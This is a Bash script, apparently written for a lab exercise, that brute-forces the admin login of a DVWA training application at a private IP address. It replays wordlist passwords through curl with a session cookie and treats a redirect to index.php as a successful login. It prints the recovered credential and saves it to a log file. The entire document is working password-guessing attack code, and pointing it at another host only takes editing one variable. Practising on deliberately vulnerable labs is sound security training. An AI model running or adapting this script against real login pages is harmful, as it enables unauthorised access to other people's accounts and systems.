#!/bin/bash
TARGET="http://10.0.2.3/dvwa/login.php"
USER="admin"
WORDLIST="wordlists/lowsenhas.txt"
COOKIES="cookies-attack.txt"
LOGFILE="dvwa-attack-result.txt"
TOTAL=$(wc -l < "$WORDLIST")
COUNT=0

rm -f "$COOKIES" "$LOGFILE"
curl -s -c "$COOKIES" "$TARGET" -o /dev/null

while IFS= read -r pass; do
    COUNT=$((COUNT + 1))
    printf "\rTestando senha %d/%d..." "$COUNT" "$TOTAL"

    LOCATION=$(curl -s -i -b "$COOKIES" -c "$COOKIES" -X POST "$TARGET" \
        -d "username=${USER}&password=${pass}&Login=Login" | grep -i "^Location:")

    if echo "$LOCATION" | grep -q "index.php"; then
        echo -e "\n[+] CREDENCIAL ENCONTRADA: ${USER}:${pass}"
        echo "Credencial encontrada: ${USER}:${pass}" > "$LOGFILE"
        echo "Testada em $(date)" >> "$LOGFILE"
        echo "Tentativas realizadas: ${COUNT}/${TOTAL}" >> "$LOGFILE"
        break
    fi
done < "$WORDLIST"

if [ ! -f "$LOGFILE" ]; then
    echo -e "\n[-] Nenhuma credencial encontrada na wordlist."
fi
